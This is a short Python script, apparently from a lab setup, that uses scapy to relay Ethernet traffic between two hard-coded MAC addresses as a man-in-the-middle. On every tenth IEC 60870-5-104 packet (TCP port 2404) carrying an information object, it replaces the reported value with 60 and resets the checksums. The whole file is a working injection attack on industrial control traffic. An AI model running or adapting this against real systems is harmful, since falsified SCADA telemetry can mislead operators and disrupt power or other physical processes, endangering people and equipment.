#!/usr/bin/env python3

from collections import Counter, deque
from hashlib import md5
from scapy.all import sniff, send, sendp
from IEC104_Raw.dissector import *
from copy import deepcopy
import os

contador = 0

altered = deque(list(), 10)

def custom_action(packet):
    global contador
    
    p = deepcopy(packet)
    if md5(bytes(p)).hexdigest() in altered:
        return None
    if not str(packet['Ether'].dst).lower() == 'ff:ff:ff:ff:ff:ff':
        if str(packet['Ether'].src).lower() == '54:bf:64:9f:ec:85':
            p['Ether'].src = packet['Ether'].dst
            p['Ether'].dst = 'dc:a6:32:19:4a:95'
        elif str(packet['Ether'].src).lower() == 'dc:a6:32:19:4a:95':
            p['Ether'].src = packet['Ether'].dst
            p['Ether'].dst = '54:bf:64:9f:ec:85'
        
        if packet.haslayer('TCP') and packet['TCP'].dport == 2404:
            
            if p.haslayer('IOA'):
                if contador % 10 == 0:
                    value = float(p['IOA'].Value)
                    # p['IOA'].Value = value + 100.0
                    p['IOA'].Value = 60
                    p['IP'].chksum =  None
                    p['TCP'].chksum = None
                contador= contador + 1
                
        altered.append(md5(bytes(p)).hexdigest())
    else:
        return None
    sendp(p, iface='en3')
    return None

## Setup sniff, filtering for IP traffic
sniff(iface="en3", filter="ip", prn=custom_action)
